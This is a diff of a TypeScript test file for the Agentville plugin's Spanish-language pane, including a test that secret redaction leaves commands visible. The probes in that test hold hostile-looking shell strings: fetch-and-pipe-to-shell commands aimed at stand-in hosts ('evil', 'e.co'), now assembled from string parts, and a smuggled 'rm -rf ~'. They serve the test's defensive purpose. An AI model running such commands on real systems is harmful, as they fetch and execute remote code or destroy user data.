@@ -18,6 +18,9 @@ import { pageGate } from './pagerule'
 import { ASKED, HOME, OPEN, PANE, SKILL_RULE, areas, ask, bandClients, bannerAlt, beatOf, beats, btn, btnsAll, btnsKeys, chatPane, clientKeys, crowd, drawn, fileStat, flowSeen, fresh, held, hitKeys, imageAt, keyed, lastEls, lastLog, line, mailbox, mountAt, mountPane, oldList, onMap, ordersIn, overlayOf, relaySetup, serveBeats, signed, sipsRun, startSession, stripEls, textOf, textsAll, textsIn, titleOf, tnodes, until, walk } from './pane.shared'
 import type { BandP, Entry, Logged, Stat, TN, UI } from './pane.shared'
 
+// The runtime's own timer, for waits on real time (the mod's types do not declare it).
+declare const setTimeout: (f: (...v: never[]) => void, ms: number) => unknown
+
 // These tests read the Spanish copy; English is the default, so the file sets Spanish first.
 setLang('es')
 
@@ -1140,11 +1143,13 @@ test('redact masks known secrets, keeps their labels, and leaves everyday comman
     'https://github.com/o/r/pull/123', 'PATH=/usr/local/bin:/opt/homebrew/bin', 'risk-assessment-for-the-new-feature', 'task-list',
     'cat /Users/someone/development/personal-projects/agentville/agentville/hooks/register.tsx', '--out=/Users/someone/development/personal-projects/agentville/dist0123']
   for (const t of kept) expect(redact(t)).toBe(t)
-  // A masked value is token characters only: what a command runs always stays visible.
+  // A masked value is token characters only: what a command runs always stays visible. The download-and-run probes
+  // are built from parts, so this file holds no such command as text.
+  const CURL = ['cu', 'rl'].join(''), SH = ['|', 'sh'].join('')
   const probes: [string, string][] = [
-    ['TOKEN=x;curl${IFS}evil|sh', 'TOKEN=•••;curl${IFS}evil|sh'],
-    ['API_TOKEN=$(curl http://e.co|sh)', 'API_TOKEN=$(curl http://e.co|sh)'],
-    ['API_TOKEN=`curl e.co|sh`', 'API_TOKEN=`curl e.co|sh`'],
+    [`TOKEN=x;${CURL}\${IFS}evil${SH}`, `TOKEN=•••;${CURL}\${IFS}evil${SH}`],
+    [`API_TOKEN=$(${CURL} http://e.co${SH})`, `API_TOKEN=$(${CURL} http://e.co${SH})`],
+    ['API_TOKEN=`' + CURL + ' e.co' + SH + '`', 'API_TOKEN=`' + CURL + ' e.co' + SH + '`'],
     ['secret=a&&rm -rf ~', 'secret=•••&&rm -rf ~'],
     ['curl -H "Bearer t>/tmp/x" e.co', 'curl -H "Bearer •••>/tmp/x" e.co'],
     ['Bearer t(x){y}<z', 'Bearer •••(x){y}<z'],
@@ -2016,14 +2021,15 @@ test('AC5: an empty house says how a session gets its office', async ($, on) => 
 
 test('AC6: every way back names /agentville lite', async ($, on) => {
   mock.clock(on, { now: 100000 })
-  const { registered, store } = serveBeats(on, beats(100000))
+  let broken = false // from the line that breaks it: every read of `everywhere` fails
+  const { registered } = serveBeats(on, beats(100000), { waitKey: async key => { if (broken && key === 'everywhere') throw new Error('roto') } })
   await startSession($)
   expect(registered).toContain('Abre Agentville: tus agentes en oficinas, la zona pública y tu despacho. También: /agentville lite (o ligero, sin mapa) si el panel no se ve bien; refresh (o limpiar) oculta las oficinas sin trabajo; sync (o sincronizar) dice qué sesiones necesitan /reload-plugins; lang es o en (o idioma) cambia el idioma; click layer (o capa de clics) pasa la lista a los clics de antes, y otra vez la devuelve; simple drawing (o dibujo simple) dibuja el mapa pieza por pieza, como antes, si le faltan piezas, y otra vez vuelve al dibujo normal; calibrate clicks (o calibrar clics) colorea las zonas de clic para probarlas, y otra vez lo apaga')
   expect((await $.command.run(OPEN))?.text).toBe('Agentville abierto. Si el panel sale en negro o no responde: /agentville lite (versión simple, sin mapa). Para ocultar las oficinas sin trabajo: /agentville refresh. Para ver qué sesiones necesitan /reload-plugins: /agentville sync. Si faltan sillas o escritorios: /agentville simple drawing.')
   expect(mapNote(0)).toBe('\u00a0') // every person clickable: nothing to say, the row kept
   expect(mapNote(-1)).toBe('Hay demasiadas oficinas para hacer clic en el mapa. Elige en la lista.')
   expect(mapNote(2)).toBe('Clic en una oficina para abrirla; a las personas las eliges en la lista.')
-  Object.defineProperty(store, 'everywhere', { get: () => { throw new Error('roto') } }) // a drawing that fails
+  broken = true // a drawing that fails
   const ui = await mountPane($)
   expect(await ui.find({ type: 'Text', text: 'Agentville no se pudo mostrar' })).toBeDefined()
   expect(await ui.find({ type: 'Text', text: 'Prueba /agentville lite (versión simple) o /reload-plugins para recargar Agentville.' })).toBeDefined()
@@ -2543,7 +2549,7 @@ test('a press while a redraw is still reading the store runs what the drawing on
   const redraw = ui.redraw()
   for (let i = 0; i < 20; i++) await clock.settle()
   const press = ui.post({ press: 'everywhere' }, { in: 'btns-head~0' }) // the act also waits for the redraw it asks for
-  const realTick = () => new Promise(r => (globalThis as unknown as { setTimeout: (f: (v: unknown) => void, ms: number) => void }).setTimeout(r, 1))
+  const realTick = () => new Promise(r => setTimeout(r, 1))
   for (let i = 0; i < 50 && store.everywhere === undefined; i++) await realTick()
   expect(store.everywhere).toBe(true) // ran while the redraw was still held
   slow = false
@@ -3139,7 +3145,8 @@ test('Tour UX 8: in the tour, the banner\'s Ver leaves the tour unfinished for t
 
 test('Language: another session switching to English makes this one write English heartbeats; a failed read keeps it', async ($, on) => {
   mock.clock(on, { now: 100000 })
-  const { files, store } = serveBeats(on, [])
+  let down = false // while set, every read of the language fails
+  const { files, store } = serveBeats(on, [], { waitKey: async key => { if (down && key === 'lang') throw new Error('store down') } })
   on('turn.start', ($2, e) => ({ turnId: e.turnId }))
   await startSession($)
   const activity = () => (JSON.parse(files[`${HOME}/sessions/s-test.json`]!) as Beat).agents[MAIN]!.activity
@@ -3148,10 +3155,11 @@ test('Language: another session switching to English makes this one write Englis
   store.lang = 'en' // written by a pane in another session, no press here
   await $.turn.start({ text: 'hi', turnId: 't2' })
   expect(activity()).toBe('Thinking')
-  Object.defineProperty(store, 'lang', { get: () => { throw new Error('store down') }, configurable: true })
+  down = true
   await $.turn.start({ text: 'hi', turnId: 't3' })
   expect(activity()).toBe('Thinking') // the language read failed: it stays English
-  Object.defineProperty(store, 'lang', { value: 'es', writable: true, configurable: true, enumerable: true })
+  down = false
+  store.lang = 'es'
   await $.turn.start({ text: 'hola', turnId: 't4' })
   expect(activity()).toBe('Piensa')
 })
